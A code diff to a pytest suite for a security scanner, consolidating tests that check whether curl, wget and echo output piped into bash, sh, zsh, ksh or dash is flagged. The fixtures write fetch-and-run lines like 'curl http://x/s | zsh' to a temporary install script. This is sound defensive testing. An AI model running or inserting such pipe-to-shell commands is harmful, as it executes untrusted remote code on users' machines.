@@ -182,25 +182,18 @@ class TestScanFile:
         assert any(fi.pattern_id == "reverse_shell" for fi in scan_file(shell, "shell.sh"))
 
     @pytest.mark.parametrize("shell", ["bash", "sh", "zsh", "ksh", "dash"])
-    def test_curl_pipe_to_any_shell_flags(self, tmp_path, shell):
-        """The pipe-to-shell patterns once accepted only bash/sh, so
-        `curl url | zsh` in a shipped script ran unflagged."""
+    def test_pipe_to_any_shell_flags(self, tmp_path, shell):
+        """The pipe-to-shell patterns once accepted only bash/sh, so `curl url | zsh`
+        in a shipped script scanned clean (#116456)."""
         f = tmp_path / "install.sh"
-        f.write_text(f"curl http://x/s | {shell}\n", encoding="utf-8")
-        findings = scan_file(f, "install.sh")
-        assert any(fi.pattern_id == "curl_pipe_shell" for fi in findings)
-
-    @pytest.mark.parametrize("shell", ["zsh", "ksh", "dash"])
-    def test_wget_and_echo_pipe_to_other_shells_flag(self, tmp_path, shell):
-        f = tmp_path / "run.sh"
         f.write_text(
+            f"curl http://x/s | {shell}\n"
             f"wget http://x/s -O - | {shell}\n"
             f"echo payload | {shell}\n",
             encoding="utf-8",
         )
-        ids = {fi.pattern_id for fi in scan_file(f, "run.sh")}
-        assert "wget_pipe_shell" in ids
-        assert "echo_pipe_exec" in ids
+        ids = {fi.pattern_id for fi in scan_file(f, "install.sh")}
+        assert {"curl_pipe_shell", "wget_pipe_shell", "echo_pipe_exec"} <= ids
 
     def test_detect_gitlab_pat(self, tmp_path):
         f = tmp_path / "leak.md"
